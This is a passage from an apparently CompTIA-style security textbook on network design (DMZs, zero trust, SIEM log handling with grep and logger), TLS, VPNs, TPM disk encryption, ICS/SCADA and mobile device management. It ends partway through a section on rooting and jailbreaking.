- Internet/guest—this is a zone permitting anonymous access (or perhaps a mix of anonymous and authenticated access) by untrusted hosts over the Internet.

A large network may need more zones to represent different host groups, such as separating wireless stations from desktop workstations, and putting servers in their own groups. Cisco's enterprise security architecture uses core and distribution layers to interconnect access blocks, with each access block representing a different zone and business function.

DEMILITARIZED ZONES

The most important distinction between different security zones is whether a host is Internet-facing. An Internet-facing host accepts inbound connections from and makes connections to hosts on the Internet. Internet-facing hosts are placed in one or more demilitarized zones (DMZs). A DMZ is also referred to as a perimeter or edge network. The basic principle of a DMZ is that traffic cannot pass directly through it. A DMZ enables external clients to access data on private systems, such as web servers, without compromising the security of the internal network as a whole. If communication is required between hosts on either side of a DMZ, a host within the DMZ acts as a proxy. For example, if an intranet host requests a connection with a web server on the Internet, a proxy in the DMZ takes the request and checks it. If the request is valid, it retransmits it to the destination. External hosts have no idea about what (if anything) is behind the DMZ.

Both extranet and Internet services are likely to be Internet-facing. The hosts that provide the extranet or public access services should be placed in one or more demilitarized zones. These would typically include web servers, mail and other communications servers, proxy servers, and remote access servers. The hosts in a DMZ are not fully trusted by the internal network because of the possibility that they could be compromised from the Internet. They are referred to as bastion hosts and run minimal services to reduce the attack surface as much as possible. A bastion host would not be configured with any data that could be a security risk to the internal network, such as user account credentials.

It is quite likely that more than one DMZ will be required as the services that run in them may have different security requirements :

- A DMZ hosting proxies or secure web gateways to allow employees access to web browsing and other Internet services.
- A DMZ hosting communication servers, such as email, VoIP, and conferencing.
- A DMZ for servers providing remote access to the local network via a Virtual Private Network (VPN).
- A DMZ hosting traffic for authorized cloud applications.
- A multi-tier DMZ to isolate front-end, middleware, and back-end servers.

DEMILITARIZED ZONE TOPOLOGIES

To configure a DMZ, two different security configurations must be enabled: one on the external interface and one on the internal interface. A DMZ and intranet are on different subnets, so communications between them need to be routed.
### Screened Subnet
A screened subnet uses two firewalls placed on either side of the DMZ. The edge firewall restricts traffic on the external/public interface and allows permitted traffic to the hosts in the DMZ. The edge firewall can be referred to as the screening firewall or router. The internal firewall filters communications between hosts in the DMZ and hosts on the LAN. This firewall is often described as the choke firewall. A choke point is a purposefully narrow gateway that facilitates better access control and easier monitoring.
### Triple-Homed Firewall
A DMZ can also be established using one router/firewall appliance with three network interfaces, referred to as triple-homed. One interface is the public one, another is the DMZ, and the third connects to the LAN. Routing and filtering rules determine what forwarding is allowed between these interfaces. This can achieve the same sort of configuration as a screened subnet.

SCREENED HOSTS

Smaller networks may not have the budget or technical expertise to implement a DMZ. In this case, Internet access can still be implemented using a dual-homed proxy/gateway server acting as a screened host.

Sometimes the term DMZ (or "DMZ host") is used by SOHO router vendors to mean a host on the local network that accepts connections from the Internet. This might be simpler to configure and solve some access problems, but it makes the whole network very vulnerable to intrusion and DoS. An enterprise DMZ is established by a separate network interface and subnet so that traffic between hosts in the DMZ and the LAN must be routed (and subject to firewall rules). Most SOHO routers do not have the necessary ports or routing functionality to create a true DMZ.

IMPLICATIONS OF IPV6

IPv6 has impacts for on-premises networks, for the way your company accesses cloud services, and for the way clients access web servers and other public servers that you publish.

IPv6 may be enabled by default on clients and servers, and even on network appliances (routers and firewalls), so there must be a management and security plan for it. If IPv6 is enabled but unmanaged, there is the potential for malicious use as a backdoor or covert channel. IPv6 also exposes novel attack vectors, such as spoofing and DoS attacks on neighbor discovery (<https://www.cisco.com/c/en/us/products/ios-nx-os-software/ipv6-first-hop-security-fhs/index.html?dtid=osscdc000283>).

Hosts should be allocated IPv6 addresses that map to the same zones as the IPv4 topology. Firewalls should be configured with ACLs that either achieve the same security configuration as for IPv4 or block IPv6, if that is a better option. One issue here is that IPv6 is not intended to perform any type of address translation. Rather than obscure internal/external traffic flows with private to public address mapping, IPv6 routing and filtering policies should be configured to mirror the equivalent IPv4 architecture.

OTHER SECURE NETWORK DESIGN CONSIDERATIONS

Network design must also be considered for data centers and the cloud. A data center is a facility dedicated to hosting servers, rather than a mix of server and client workstation machines.
### East-West Traffic
Traffic that goes to and from a data center is referred to as north-south. This traffic represents clients outside the data center making requests and receiving responses. In data centers that support cloud and other Internet services, most traffic is actually between servers within the data center. This is referred to as east-west traffic.

Consider a client uploading a photograph as part of a social media post. The image file might be checked by an analysis server for policy violations (indecent or copyright images, for instance), a search/indexing service would be updated with the image metadata, the image would be replicated to servers that provision content delivery networks (CDNs), the image would be copied to backup servers, and so on. A single request to the cloud tends to cascade to multiple requests and transfers within the cloud.

The preponderance of east-west traffic complicates security design. If each of these cascading transactions were to pass through a firewall or other security appliance, it would create a severe bottleneck. These requirements are driving the creation of virtualized security appliances that can monitor traffic as it passes between servers ([blogs.cisco.com/security/trends-in-data-center-security-part-1-traffic-trends](https://blogs.cisco.com/security/trends-in-data-center-security-part-1-traffic-trends)).
### Zero Trust
Zero trust is based on the idea that perimeter security is unlikely to be completely robust. On a modern network, there are just too many opportunities for traffic to escape monitoring by perimeter devices and DMZs. Zero trust uses systems such as continuous authentication and conditional access to mitigate privilege escalation and account compromise by threat actors.

Another zero trust technique is to apply microsegmentation. Microsegmentation is a security process that is capable of applying policies to a single node, as though it was in a zone of its own. Like east-west traffic, this requires a new generation of virtualized security appliances to implement ([vmware.com/solutions/micro-segmentation.html](https://www.vmware.com/solutions/micro-segmentation.html)). 

SECURITY INFORMATION AND EVENT MANAGEMENT

Software designed to assist with managing security data inputs and provide reporting and alerting is often described as security information and event management (SIEM). The core function of a SIEM tool is to aggregate traffic data and logs. In addition to logs from Windows and Linux-based hosts, this could include switches, routers, firewalls, IDS sensors, vulnerability scanners, malware scanners, data loss prevention (DLP) systems, and databases.

OSSIM SIEM dashboard—Configurable dashboards provide the high-level status view of network security metrics. (Screenshot used with permission from AT&T Cybersecurity.)
### Log Collection 
The first task for SIEM is to collect data inputs from multiple sources. There are three main types of log collection:

- Agent-based—with this approach, you must install an agent service on each host. As events occur on the host, logging data is filtered, aggregated, and normalized at the host, then sent to the SIEM server for analysis and storage.
- Listener/collector—rather than installing an agent, hosts can be configured to push updates to the SIEM server using a protocol such as syslog or SNMP. A process runs on the management server to parse and normalize each log/monitoring source.

  Syslog ([tools.ietf.org/html/rfc3164](https://tools.ietf.org/html/rfc3164)) allows for centralized collection of events from multiple sources. It also provides an open format for event logging messages, and as such has become a de facto standard for logging of events from distributed systems. For example, syslog messages can be generated by Cisco routers and switches, as well as servers and workstations.
- Sensor—as well as log data, the SIEM might collect packet captures and traffic flow data from sniffers. 

Enabling a log parser plug-in for a pfSense security appliance so that firewall events can be imported into the SIEM. (Screenshot used with permission from AT&T Cybersecurity.)
### Log Aggregation 
Log aggregation refers to normalizing data from different sources so that it is consistent and searchable. SIEM software features connectors or plug-ins to interpret (or parse) data from distinct types of systems and to account for differences between vendor implementations. Usually parsing will be carried out using regular expressions tailored to each log file format to identify attributes and content that can be mapped to standard fields in the SIEM's reporting and analysis tools. Another important function is to normalize date/time zone differences to a single timeline.

FILE MANIPULATION

While SIEM can automate many functions of log collection and review, you may also have to manually prepare data using a Linux command line.
### The cat Command
The Linux command cat allows you to view the contents of one or more files. For example, if you want to view the whole contents of two rotated log files, you could run:

cat -n access.log access2.log

The -n switch adds line numbers. If you wanted to output to a new file rather than the terminal, you can run:

cat -n access.log access2.log > access\_cat.log
### The head and tail Commands
The head and tail commands output the first and last 10 lines respectively of a file you provide. You can also adjust this default value to output more or fewer lines using the -n switch. For example, the following command shows the 20 most recent entries in a log file:

tail /var/log/messages -n 20
### The logger Command
The logger command writes input to the local system log or to a remote syslog server ([linux.die.net/man/1/logger](https://linux.die.net/man/1/logger)). You can use the command in a script to write any text string or use the -f option to write the contents of another file. You can also write the output of commands by enclosing the command in backticks. The following command writes the name of the local machine along with the text "up" to the syslog server at 10.1.0.242:

logger -n 10.1.0.242 `hostname` up

REGULAR EXPRESSIONS AND GREP

Filtering a log to discover data points of interest usually involves some sort of string search, typically invoking regular expression (regex) syntax. A regular expression is a search pattern to match within a given string. The search pattern is built from the regex syntax. This syntax defines metacharacters that function as search operators, quantifiers, logic statements, and anchors/boundaries. The following list illustrates some commonly used elements of regex syntax:

- [ … ] matches a single instance of a character within the brackets. This can include literals, ranges such as [a-z], and token matches, such as [\s] (white space) or [\d] (one digit).
- + matches one or more occurrences. A quantifier is placed after the term to match; for example, \s+ matches one or more white space characters.
- \* matches zero or more times.
- ? matches once or not at all.
- {} matches a number of times. For example, {2} matches two times, {2,} matches two or more times, and {2,5} matches two to five times.

A complete description of regex syntax is beyond the scope of this course, but you can use an online reference such as [regexr.com](https://regexr.com/) or [rexegg.com](http://rexegg.com/) to learn it.

The grep command invokes simple string matching or regex syntax to search text files for specific strings. This enables you to search the entire contents of a text file for a specific pattern within each line and display that pattern on the screen or dump it to another file. A simple example of grep usage is as follows:

grep -F 192.168.1.254 access.log

This searches the text file access.log for all lines containing some variation of the literal string pattern 192.168.1.254 and prints only those lines to the terminal. The -F switch instructs grep to treat the pattern as a literal.

The following example searches for any IP address in the 192.168.1.0/24 subnet using regex syntax for the pattern (note that each period must be escaped) within any file in any directory from the current one. The -r option enables recursion, while the period in the target part indicates the current directory:

grep -r 192\.168\.1\.[\d]{1,3} ./\*

TRANSPORT LAYER SECURITY 

As with other early TCP/IP application protocols, HTTP communications are not secured. Secure Sockets Layer (SSL) was developed by Netscape in the 1990s to address the lack of security in HTTP. SSL proved very popular with the industry, and it was quickly adopted as a standard named Transport Layer Security (TLS). It is typically used with HTTP (referred to as HTTPS or HTTP Secure) but can also be used to secure other application protocols and as a virtual private networking (VPN) solution.

To implement TLS, a server is assigned a digital certificate signed by some trusted certificate authority (CA). The certificate proves the identity of the server (assuming that the client trusts the CA) and validates the server's public/private key pair. The server uses its key pair and the TLS protocol to agree upon mutually supported ciphers with the client and negotiate an encrypted communications session.

HTTPS operates over port 443 by default. HTTPS operation is indicated by using https:// for the URL and by a padlock icon shown in the browser.

It is also possible to install a certificate on the client so that the server can trust the client. This is not often used on the web but is a feature of VPNs and enterprise networks that require mutual authentication.
### SSL/TLS Versions 
While the acronym SSL is still used, the Transport Layer Security versions are the only ones that are safe to use. A server can provide support for legacy clients, but obviously this is less secure. For example, a TLS 1.2 server could be configured to allow clients to downgrade to TLS 1.1 or 1.0 or even SSL 3.0 if they do not support TLS 1.2.

A downgrade attack is where a man-in-the-middle tries to force the use of a weak cipher suite and SSL/TLS version.

TLS version 1.3 was approved in 2018. One of the main features of TLS 1.3 is the removal of the ability to perform downgrade attacks by preventing the use of unsecure features and algorithms from previous versions. There are also changes to the handshake protocol to reduce the number of messages and speed up connections. 
### Cipher Suites
A cipher suite is the algorithms supported by both the client and server to perform the different encryption and hashing operations required by the protocol. Prior to TLS 1.3, a cipher suite would be written in the following form:

ECDHE-RSA-AES128-GCM-SHA256

This means that the server can use Elliptic Curve Diffie-Hellman Ephemeral mode for session key agreement, RSA signatures, 128-bit AES-GCM (Galois Counter Mode) for symmetric bulk encryption, and 256-bit SHA for HMAC functions. Suites the server prefers are listed earlier in its supported cipher list.

TLS 1.3 uses simplified and shortened suites. A typical TLS 1.3 cipher suite appears as follows:

TLS\_AES\_256\_GCM\_SHA384

Only ephemeral key agreement is supported in 1.3 and the signature type is supplied in the certificate, so the cipher suite only lists the bulk encryption key strength and mode of operation (AES\_256\_GCM), plus the cryptographic hash algorithm (SHA384) used within the new hash key derivation function (HKDF). HKDF is the mechanism by which the shared secret established by Diffie Hellman key agreement is used to derive symmetric session keys.

Viewing the TLS handshake in a Wireshark packet capture. Note that the connection is using TLS 1.3 and one of the shortened cipher suites (TLS\_AES\_128\_GCM\_SHA256).

API CONSIDERATIONS

HTTP is now used less to serve static web pages, and more to create web applications, often as part of a cloud product. An enterprise might use both public web applications over the Internet and private ones. The primary means of configuring and managing a web application is via its application programming interface (API). For example, an application might allow a user account to be created via a URL:

https://example.foo/api/users?api\_key=123456

The developer uses the POST method to submit data to the URL with the required parameters coded into the request body, often in JavaScript Object Notation (JSON).

POST /api/users HTTP/1.1

Content-Type: application/json

{

` `"user": {

`   `"name": "James",

`   `"email": "jpengelly@comptia.org"

` `}

}

Use of these APIs is authorized via a token or secret key. Effective management of these API secrets is a key consideration in modern networks, as they have been widely used to perpetrate various breaches and data thefts. For example, putting the key in the URL carries a severe risk of exposure. APIs can use more secure authentication and authorization methods, such as SAML and OAuth, but these still come with secrets management requirements. Another API consideration is that usage should be monitored to ensure only authorized endpoints are making transactions. 

LAYER 2 TUNNELING PROTOCOL AND IKE V2

This first version of IKE is optimized to ensure the mutual authentication of two peer hosts, such as in a site-to-site VPN. On its own, it does not provide a simple means for a client user account to authenticate to a remote network directory. Consequently, for remote access VPNs, a combination of IPSec with the Layer 2 Tunneling Protocol (L2TP) VPN protocol is often used.
### Layer 2 Tunneling Protocol/IPSec VPN
A L2TP/IPSec VPN would typically operate as follows:

1. The client and VPN gateway set up a secure IPSec channel over the Internet, using either a pre-shared key or certificates for IKE.
1. The VPN gateway uses L2TP to set up a tunnel to exchange local network data encapsulated as Point-to-Point Protocol (PPP) frames. This double encapsulation of traffic is the main drawback, as it adds overhead.
1. The user authenticates over the PPP session using EAP or CHAP.
### IKE v2
The drawbacks of the original version of IKE were addressed by an updated protocol. IKE v2 has some additional features that have made the protocol popular for use as a standalone remote access VPN solution. The main changes are:

- Support for EAP authentication methods, allowing, for example, user authentication against a RADIUS server.
- Simplified connection set up—IKE v2 specifies a single 4-message setup mode, reducing bandwidth without compromising security.
- Reliability—IKE v2 allows NAT traversal and MOBIKE multihoming. Multihoming means that a client such as a smartphone with multiple interfaces (such as Wi-Fi and cellular) can keep the IPSec connection alive when switching between them.

Compared to L2TP/IPSec, using IKE v2 is more efficient. This solution is becoming much better supported, with native support in Windows 10, for instance. 

OUT-OF-BAND MANAGEMENT AND JUMP SERVERS 

Remote access management refers to the specific use case of using a secure channel to administer a network appliance or server. The secure admin workstations (SAWs) used to perform management functions must be tightly locked down, ideally installed with no software other than that required to access the administrative channel—minimal web browser, remote desktop client, or SSH virtual terminal, for instance. SAWs should be denied Internet access or be restricted to a handful of approved vendor sites (for patches, drivers, and support). The devices must also be subject to stringent access control and auditing so that any misuse is detected at the earliest opportunity.
### Out-of-Band Management
Remote management methods can be described as either in-band or out-of-band (OOB). An in-band management link is one that shares traffic with other communications on the "production" network. A serial console or modem port on a router is a physically out-of-band management method. When using a browser-based management interface or a virtual terminal over Ethernet and IP, the link can be made out-of-band by connecting the port used for management access to physically separate network infrastructure. This can be costly to implement, but out-of-band management is more secure and means that access to the device is preserved when there are problems affecting the production network. With an in-band connection, better security can be implemented by using a VLAN to isolate management traffic. This makes it harder for potential eavesdroppers to view or modify traffic passing over the management interface. This sort of virtual OOB does still mean that access could be compromised by a system-wide network failure, however.
### Jump Servers
One of the challenges of managing hosts that are exposed to the Internet, such as servers and appliances in a DMZ, is to provide administrative access to them. Accessing these individual hosts directly from a secure zone may open their administrative interfaces to exploitation and be used as a pivot point back into the internal network. Consequently, the administrative servers in the secure zone that are permitted to access hosts in the DMZ must be tightly controlled. Configuring and auditing this type of control when there are many different servers operating in both zones is complex.

One solution to this complexity is to add a single administration server, or jump server, to the secure zone. The jump server only runs the necessary administrative port and protocol (typically SSH or RDP). Administrators connect to the jump server then use the jump server to connect to the admin interface on the application server. The application server's admin interface has a single entry in its ACL (the jump server) and denies connection attempts from any other hosts. 

Securing management traffic using a jump server. (Images © 123RF.com.)

HARDWARE ROOT OF TRUST 

A hardware Root of Trust (RoT) or trust anchor is a secure subsystem that is able to provide attestation. Attestation means that a statement made by the system can be trusted by the receiver. For example, when a computer joins a network, it might submit a report to the network access control (NAC) server declaring, "My operating system files have not been replaced with malicious versions." The hardware root of trust is used to scan the boot metrics and OS files to verify their signatures, then it signs the report. The NAC server can trust the signature and therefore the report contests if it can trust that the signing entity's private key is secure. 

The RoT is usually established by a type of cryptoprocessor called a trusted platform module (TPM). TPM is a specification for hardware-based storage of encryption keys, hashed passwords, and other user and platform identification information. The TPM is implemented either as part of the chipset or as an embedded function of the CPU.

Each TPM is hard-coded with a unique, unchangeable asymmetric private key called the endorsement key. This endorsement key is used to create various other types of subkeys used in key storage, signature, and encryption operations. The TPM also supports the concept of an owner, usually identified by a password (though this is not mandatory). Anyone with administrative control over the setup program can take ownership of the TPM, which destroys and then regenerates its subkeys. A TPM can be managed in Windows via the tpm.msc console or through group policy. On an enterprise network, provisioning keys to the TPM might be centrally managed via the Key Management Interoperability Protocol (KMIP).

Configuring a Trusted Platform Module using system setup on an HP workstation. (Screenshot used with permission from HP.)

The problem with establishing a hardware root of trust is that devices are used in environments where anyone can get complete control over them. There cannot be complete assurance that the firmware underpinning the hardware root of trust is inviolable, but attacks against trusted modules are sufficiently difficult so as to provide effective security in most cases.

DISK ENCRYPTION

Full disk encryption (FDE) means that the entire contents of the drive (or volume), including system files and folders, are encrypted. OS ACL-based security measures are quite simple to circumvent if an adversary can attach the drive to a different host OS. Drive encryption allays this security concern by making the contents of the drive accessible only in combination with the correct encryption key. Disk encryption can be applied to both hard disk drives (HDDs) and solid state drives (SSDs).

FDE requires the secure storage of the key used to encrypt the drive contents. Normally, this is stored in a TPM. The TPM chip has a secure storage area that a disk encryption program, such as Windows BitLocker, can write its keys to. It is also possible to use a removable USB drive (if USB is a boot device option). As part of the setup process, you create a recovery password or key. This can be used if the disk is moved to another computer or the TPM is damaged.

Activating BitLocker drive encryption. (Screenshot used with permission from Microsoft.)

One of the drawbacks of FDE is that, because the OS performs the cryptographic operations, performance is reduced. This issue is mitigated by self-encrypting drives (SED), where the cryptographic operations are performed by the drive controller. The SED uses a symmetric data/media encryption key (DEK/MEK) for bulk encryption and stores the DEK securely by encrypting it with an asymmetric key pair called either the authentication key (AK) or key encryption key (KEK). Use of the AK is authenticated by the user password. This means that the user password can be changed without having to decrypt and re-encrypt the drive. Early types of SEDs used proprietary mechanisms, but many vendors now develop to the Opal Storage Specification ([nvmexpress.org/wp-content/uploads/TCGandNVMe_Joint_White_Paper-TCG_Storage_Opal_and_NVMe_FINAL.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/TCGandNVMe_Joint_White_Paper-TCG_Storage_Opal_and_NVMe_FINAL.pdf)), developed by the Trusted Computing Group (TCG).

As configuring passwords on individual drives is a huge challenge when more than a few machines are involved, enterprises may use the Key Management Interoperability Protocol (KMIP) along with a hardware security module (HSM) to automate the provisioning of keys ([trustedcomputinggroup.org/wp-content/uploads/SWG_TCG_Enterprise-Introduction_Sept2010.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/SWG_TCG_Enterprise-Introduction_Sept2010.pdf)).

ORGANIZATIONAL SECURITY AGREEMENTS 

It is important to remember that although one can outsource virtually any service or activity to a third party, one cannot outsource legal accountability for these services or actions. You are ultimately responsible for the services and actions that these third parties take. If they have any access to your data or systems, any security breach in their organization (for example, unauthorized data sharing) is effectively a breach in yours. Issues of security risk awareness, shared duties, and contractual responsibilities can be set out in a formal legal agreement. The following types of agreements are common:

- Memorandum of understanding (MOU)—A preliminary or exploratory agreement to express an intent to work together. MOUs are usually intended to be relatively informal and not to act as binding contracts. MOUs almost always have clauses stating that the parties shall respect confidentiality, however.
- Business partnership agreement (BPA)—While there are many ways of establishing business partnerships, the most common model in IT is the partner agreements that large IT companies (such as Microsoft and Cisco) set up with resellers and solution providers.
- Nondisclosure agreement (NDA)—Legal basis for protecting information assets. NDAs are used between companies and employees, between companies and contractors, and between two companies. If the employee or contractor breaks this agreement and does share such information, they may face legal consequences. NDAs are useful because they deter employees and contractors from violating the trust that an employer places in them.
- Service level agreement (SLA)—A contractual agreement setting out the detailed terms under which a service is provided.
- Measurement systems analysis (MSA)—quality management processes, such as Six Sigma, make use of quantified analysis methods to determine the effectiveness of a system. This can be applied to cybersecurity procedures, such as vulnerability and threat detection and response. A measurement systems analysis (MSA) is a means of evaluating the data collection and statistical methods used by a quality management process to ensure they are robust. This might be an onboarding requirement when partnering with enterprise companies or government agencies.

A legal agreement is all very well, but it is still up to you to make sure that your suppliers, vendors, and contractors can live up to it. If they can't, you may successfully sue them, but if they go out of business, you are still accountable for their actions or failures to act.

LOGIC CONTROLLERS FOR EMBEDDED SYSTEMS

Embedded systems are normally based on firmware running on a programmable logic controller (PLC). These PLCs are built from different hardware and OS components than some desktop PCs. 
### System on Chip (SoC)
Desktop computer system architecture uses a generalized CPU plus various other processors and controllers and system memory, linked via the motherboard. System on chip (SoC) is a design where all these processors, controllers, and devices are provided on a single processor die (or chip). This type of packaging saves space and is usually power efficient, and so is very commonly used with embedded systems.

Raspberry Pi ([raspberrypi.org](https://www.raspberrypi.org/)) and Arduino ([arduino.cc](https://www.arduino.cc/)) are examples of SoC boards, initially devised as educational tools, but now widely used for industrial applications, and hacking.
### Field Programmable Gate Array (FPGA)
A microcontroller is a processing unit that can perform sequential operations from a dedicated instruction set. The instruction set is determined by the vendor at the time of manufacture. Software running on the microcontroller has to be converted to these instructions (assembly language). As many embedded systems perform relatively simple but repetitive operations, it can be more efficient to design the hardware controller to perform only the instructions needed. One example of this is the application-specific integrated circuits (ASICs) used in Ethernet switches. ASICs are expensive to design, however, and work only for a single application, such as Ethernet switching.

A field programmable gate array (FPGA) is a type of controller that solves this problem. The structure of the controller is not fully set at the time of manufacture. The end customer can configure the programming logic of the device to run a specific application.
### Real-Time Operating Systems (RTOS)
Many embedded systems operate devices that perform acutely time-sensitive tasks, such as drip meters or flow valves. The kernels or operating systems that run these devices must be much more stable and reliable than the OS that runs a desktop computer or server. Embedded systems typically cannot tolerate reboots or crashes and must have response times that are predictable to within microsecond tolerances. Consequently, these systems often use differently engineered platforms called real-time operating systems (RTOS). An RTOS should be designed to have as small an attack surface as possible. An RTOS is still susceptible to CVEs and exploits, however.

INDUSTRIAL CONTROL SYSTEMS

Industrial systems have different priorities to IT systems. Often, hazardous electromechanical components are involved, so safety is the overriding priority. Industrial processes also prioritize availability and integrity over confidentiality—reversing the CIA triad as the AIC triad.
### Workflow and Process Automation Systems
Industrial control systems (ICSs) provide mechanisms for workflow and process automation. These systems control machinery used in critical infrastructure, like power suppliers, water suppliers, health services, telecommunications, and national security services. An ICS that manages process automation within a single site is usually referred to as a distributed control system (DCS).

An ICS comprises plant devices and equipment with embedded PLCs. The PLCs are linked either by an OT fieldbus serial network or by industrial Ethernet to actuators that operate valves, motors, circuit breakers, and other mechanical components, plus sensors that monitor some local state, such as temperature. Output and configuration of a PLC is performed by one or more human-machine interfaces (HMIs). An HMI might be a local control panel or software running on a computing host. PLCs are connected within a control loop, and the whole process automation system can be governed by a control server. Another important concept is the data historian, which is a database of all the information generated by the control loop.
### Supervisory Control and Data Acquisition (SCADA)
A supervisory control and data acquisition (SCADA) system takes the place of a control server in large-scale, multiple-site ICSs. SCADA typically run as software on ordinary computers, gathering data from and managing plant devices and equipment with embedded PLCs, referred to as field devices. SCADA typically use WAN communications, such as cellular or satellite, to link the SCADA server to field devices.
### ICS/SCADA Applications
These types of systems are used within many sectors of industry:

- Energy refers to power generation and distribution. More widely, utilities includes water/sewage and transportation networks.
- Industrial can refer specifically to the process of mining and refining raw materials, involving hazardous high heat and pressure furnaces, presses, centrifuges, pumps, and so on.
- Fabrication and manufacturing refer to creating components and assembling them into products. Embedded systems are used to control automated production systems, such as forges, mills, and assembly lines. These systems must work to extremely high precisions.
- Logistics refers to moving things from where they were made or assembled to where they need to be, either within a factory or for distribution to customers. Embedded technology is used in control of automated transport and lift systems plus sensors for component tracking.
- Facilities refers to site and building management systems, typically operating automated heating, ventilation, and air conditioning (HVAC), lighting, and security systems.

ICS/SCADA was historically built without regard to IT security, though there is now high awareness of the necessity of enforcing security controls to protect them, especially when they operate in a networked environment. 

SPECIALIZED SYSTEMS FOR FACILITY AUTOMATION

A specialized system refers to the use of embedded systems and/or IoT devices for a specific purpose or application.
### Building Automation System (BAS) 
A building automation system (BAS) for offices and data centers ("smart buildings") can include physical access control systems, but also heating, ventilation, and air conditioning (HVAC), fire control, power and lighting, and elevators and escalators. These subsystems are implemented by PLCs and various types of sensors that measure temperature, air pressure, humidity, room occupancy, and so on. Some typical vulnerabilities that affect these systems include:

- Process and memory vulnerabilities, such as buffer overflow, in the PLCs. These may arise from processing maliciously crafted packets in the automation management protocol. Building automation uses dedicated network protocols, such as BACnet or Dynet.
- Use of plaintext credentials or cryptographic keys within application code.
- Code injection via the graphical web application interfaces used to configure and monitor systems. This can be used to perform JavaScript-based attacks, such as clickjacking and cross-site scripting (XSS).

It is possible that control of these systems could be used to perform some sort of DoS or ransom demand (consider disrupting HVAC controls within a data center, for instance). However, as with the Target data breach, the aim is likely to access the corporate data network from the automation and monitoring system, which may be accessible via a supplier company ([krebsonsecurity.com/tag/fazio-mechanical](https://krebsonsecurity.com/tag/fazio-mechanical/)).
### Smart Meters
A smart meter provides continually updating reports of electricity, gas, or water usage to the supplier, reducing the need for manual inspections. Most meters use cellular data for communication back to the supplier, and an IoT protocol, such as ZigBee, for integration with smart appliances.  
### Surveillance Systems
A physical access control system (PACS) is a network of monitored locks, intruder alarms, and video surveillance. A PACS can either be implemented as part of a building automation system or a separate system in its own right. Gaining physical access to premises, or even just access to video monitoring systems, gives an adversary many opportunities to develop additional attacks. As with building automation, a PACS is likely to be installed and maintained by an external supplier. This can lead to it being omitted from risk and vulnerability assessments, as highlighted by the US Government Accountability Office's 2014 report into PACS at federal offices ([gao.gov/assets/670/667512.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/667512.pdf)).

Physical security systems use networked camera systems (CCTV) for surveillance. Unfortunately, some makes of camera systems have been found to have numerous serious vulnerabilities that allow attackers either to prevent intrusions from being recorded or to hijack the cameras to perform their own surveillance. These issues tend to affect cheap consumer-grade systems rather than enterprise models, but in both cases it is necessary to evaluate the supplier to demonstrate that their security monitoring and remediation support services are effective.

MOBILE DEVICE DEPLOYMENT MODELS

Mobile devices have replaced computers for many email and daily management tasks and are integral to accessing many other business processes and cloud-based applications. A mobile device deployment model describes the way employees are provided with mobile devices and applications.

- Bring your own device (BYOD)—the mobile device is owned by the employee. The mobile will have to meet whatever profile is required by the company (in terms of OS version and functionality) and the employee will have to agree on the installation of corporate apps and to some level of oversight and auditing. This model is usually the most popular with employees but poses the most difficulties for security and network managers.
- Corporate owned, business only (COBO)—the device is the property of the company and may only be used for company business.
- Corporate owned, personally-enabled (COPE)—the device is chosen and supplied by the company and remains its property. The employee may use it to access personal email and social media accounts and for personal web browsing (subject to whatever acceptable use policies are in force).
- Choose your own device (CYOD)—much the same as COPE but the employee is given a choice of device from a list.

Virtualization can provide an additional deployment model. Virtual desktop infrastructure (VDI) means provisioning an OS desktop to interchangeable hardware. The hardware only has to be capable of running a VDI client viewer, or have browser support for a clientless HTML5 solution. The instance is provided "as new" for each session and can be accessed remotely. The same technology can be accessed via a mobile device such as a smartphone or tablet. This removes some of the security concerns about BYOD as the corporate apps and data are segmented from the other apps on the device. 

ENTERPRISE MOBILITY MANAGEMENT

Enterprise mobility management (EMM) is a class of management software designed to apply security policies to the use of mobile devices and apps in the enterprise. The challenge of identifying and managing attached devices is often referred to as visibility. EMM software can be used to manage enterprise-owned devices as well as BYOD. There are two main functions of an EMM product suite:

- Mobile device management (MDM)—sets device policies for authentication, feature use (camera and microphone), and connectivity. MDM can also allow device resets and remote wipes.
- Mobile application management (MAM)—sets policies for apps that can process corporate data, and prevents data transfer to personal apps. This type of solution configures an enterprise-managed container or workspace.

Additionally, distinguishing whether client endpoints are mobile or fixed is not really a critical factor for many of these management tasks, with the consequence that the latest suites aim for visibility across PC, laptop, smartphone, tablet, and even IoT devices. These suites are called unified endpoint management (UEM) ([redmondmag.com/Articles/2017/10/01/Unified-Endpoint-Management.aspx](https://redmondmag.com/Articles/2017/10/01/Unified-Endpoint-Management.aspx)).

The core functionality of endpoint management suites extends the concept of network access control (NAC) solutions. The management software logs the use of a device on the network and determines whether to allow it to connect or not, based on administrator-set parameters. When the device is enrolled with the management software, it can be configured with policies to allow or restrict use of apps, corporate data, and built-in functions, such as a video camera or microphone.

Some EMM/UEM solutions include AirWatch ([air-watch.com](https://www.air-watch.com/)), Microsoft Intune ([microsoft.com/en-us/microsoft-365/enterprise-mobility-security/microsoft-intune](https://www.microsoft.com/en-us/microsoft-365/enterprise-mobility-security/microsoft-intune)), Symantec/Broadcom ([broadcom.com/products/cyber-security/endpoint/end-user/protection-mobile](https://www.broadcom.com/products/cyber-security/endpoint/end-user/protection-mobile)), and Citrix Endpoint Management (formerly XenMobile) ([citrix.com/products/citrix-endpoint-management](https://www.citrix.com/products/citrix-endpoint-management/)).

CONTENT MANAGEMENT 

Containerization allows the employer to manage and maintain the portion of the device that interfaces with the corporate network. An enterprise workspace with a defined selection of apps and a separate container is created. This container isolates corporate apps from the rest of the device. There may be a requirement for additional authentication to access the workspace.

The container can also enforce storage segmentation. With storage segmentation the container is associated with a directory on the persistent storage device that is not readable or writable by apps that are not in the container. Conversely, apps cannot write to areas outside the container, such as external media or using copy and paste to a non-container app. App network access might be restricted to a VPN tunneled through the organization's security system.

The enterprise is thereby able to maintain the security it needs, without having to enforce policies that affect personal use, apps, or data. 

Containerization also assists content management and data loss prevention (DLP) systems. A content management system tags corporate or confidential data and prevents it from being shared or copied to unauthorized external media or channels, such as non-corporate email systems or cloud storage services. 

ROOTING AND JAILBREAKING 

Like Windows and Linux, the account used to install the OS and run kernel-level processes is not the one used by the device owner. Users who want to avoid the restrictions that some OS vendors, handset OEMs, and telecom providers (carriers) put on the devices must use some type of privilege escalation:

- Rooting—this term is associated with Android devices. Some vendors provide authorized mechanisms for users to access the root account on their device. For some devices it is necessary to exploit a vulnerability or use custom firmware. Custom firmware is essentially a new Android OS image applied to the device. This can also be referred to as a custom ROM, after the term for the read only memory chips that used to hold firmware.
